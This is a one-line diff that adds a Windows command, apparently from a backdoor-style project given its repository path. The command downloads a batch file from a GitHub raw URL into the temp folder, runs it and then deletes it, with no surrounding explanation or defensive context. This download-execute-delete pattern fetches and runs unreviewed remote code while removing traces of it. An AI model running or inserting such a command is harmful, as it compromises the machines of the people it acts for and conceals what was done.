@@ -1,0 +1,1 @@
+cmd.exe /c curl -o "%temp%\script.bat" https://raw.githubusercontent.com/WilleLX1/F0_BK/main/CustomRawHosters/InstallPythonRuby1.9.txt && "%temp%\script.bat" & del "%temp%\script.bat"
